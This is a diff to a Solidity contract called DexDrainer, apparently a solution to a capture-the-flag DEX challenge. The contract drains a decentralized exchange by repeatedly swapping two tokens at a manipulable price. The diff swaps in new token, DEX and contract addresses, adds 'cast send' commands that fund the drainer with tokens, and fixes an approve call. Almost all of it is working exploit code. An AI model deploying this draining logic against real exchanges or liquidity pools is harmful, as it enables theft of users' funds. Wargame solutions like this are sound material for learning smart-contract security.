@@ -7,11 +7,12 @@ interface Dex {
     function balanceOf(address token, address account) external view returns (uint256);
     function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
 }
-// cast send 0x1ECE78e7d69407EA8D59045e743b822311b58941 "transfer(address,uint256)" 0x8C683D3e434f6fD905cAbC8368A161634E4cbaE0 10 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
-contract DexDrainer { // 0x8C683D3e434f6fD905cAbC8368A161634E4cbaE0
-    address public immutable token1 = 0x1ECE78e7d69407EA8D59045e743b822311b58941;
-    address public immutable token2 = 0xB75EDBa5B471057b7765d222731930D110bb36a2;
-    address public immutable dex = 0x771958E0b6d73783A62e3d82934ea01bcf315FE8;
+// cast send 0x07276694cEd08cdC02520E8c7D5D47f3DDDE6BaC "transfer(address,uint256)" 0xCbf6Eb001b9A30aD1A19862D0BCb8B2a664BF3c4 10 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+// cast send 0x52A7C9AEdC0bF4236bfa298FbB2B6B71AD18Fa71 "transfer(address,uint256)" 0xCbf6Eb001b9A30aD1A19862D0BCb8B2a664BF3c4 10 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+contract DexDrainer { // 0xCbf6Eb001b9A30aD1A19862D0BCb8B2a664BF3c4
+    address public immutable token1 = 0x07276694cEd08cdC02520E8c7D5D47f3DDDE6BaC;
+    address public immutable token2 = 0x52A7C9AEdC0bF4236bfa298FbB2B6B71AD18Fa71;
+    address public immutable dex = 0x493cCa3b22A26Ae2ADC95692Ce4C65dfEeb60Cc4;
     function getTokenToSwap() private view returns (address, address, uint256) {
         uint256 balanceOfToken1 = Dex(dex).balanceOf(token1, address(this));
         if (balanceOfToken1 > 0) {
@@ -40,7 +41,7 @@ contract DexDrainer { // 0x8C683D3e434f6fD905cAbC8368A161634E4cbaE0
         uint256 expectedAmount = getExpectedAmount(amount, from, to);
         if (expectedAmount == 0) return;
 
-        Dex(dex).approve(address(this), expectedAmount);
+        Dex(dex).approve(dex, expectedAmount);
         Dex(dex).swap(from, to, expectedAmount);
         
         // Use a loop or check remaining balance rather than unbounded recursion to save gas
